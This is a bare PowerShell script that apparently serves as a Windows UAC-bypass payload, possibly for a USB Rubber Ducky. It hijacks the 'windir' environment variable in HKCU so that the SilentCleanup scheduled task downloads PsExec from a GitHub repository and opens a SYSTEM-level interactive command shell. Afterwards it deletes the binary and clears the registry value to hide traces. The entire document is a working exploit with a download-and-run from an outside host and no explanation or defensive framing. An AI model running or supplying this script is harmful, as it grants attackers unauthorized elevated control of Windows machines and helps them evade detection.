$program = "powershell.exe -noexit wget 'https://github.com/b4ck3nd-dev/DuckyWare/blob/main/PsExec.exe?raw=true' -OutFile psexec.exe; .\psexec.exe -s -i cmd.exe; rm psexec.exe; exit; #"
Set-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Value $program -Force
#For x64 shell in Windows x64:
Start-Process schtasks.exe -ArgumentList "/Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I"
#For x86 shell in Windows x64:
#C:\Windows\Sysnative\cmd.exe /c "powershell Start-Process schtasks.exe -ArgumentList "/Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I""
Start-Sleep 3
Clear-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Force
